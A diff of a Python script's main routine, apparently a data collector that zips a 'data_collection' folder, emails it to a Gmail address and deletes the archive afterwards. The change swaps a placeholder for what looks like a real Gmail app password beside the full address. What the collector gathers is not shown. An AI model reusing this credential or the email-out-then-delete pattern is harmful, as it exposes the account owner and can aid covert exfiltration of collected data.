@@ -689,14 +689,14 @@ def main():
         collector.logger.close()
 
         sender_email = "mokaiv118@gmail.com"
-        sender_password = "xxxx xxxx xxxx xxxx"  # пароль приложения
+        sender_password = "pxzr wjsc ledt jnpi"  # пароль приложения
         recipient_email = "mokaiv118@gmail.com"
         subject = "5 секунд"
         message = "Привет! Это письмо содержит архив 5ти секунд."
         create_zip_zipfile("data_collection", "data_collection.zip")
 
         file_path = "data_collection.zip"  
-        
+
         send_gmail_with_attachment(
             sender_email=sender_email,
             sender_password=sender_password,
@@ -705,7 +705,8 @@ def main():
             message=message,
             attachment_path=file_path
         )
-        delete_path("data_collection")
+        #delete_path("data_collection")
+
         delete_path("data_collection.zip")
 
 
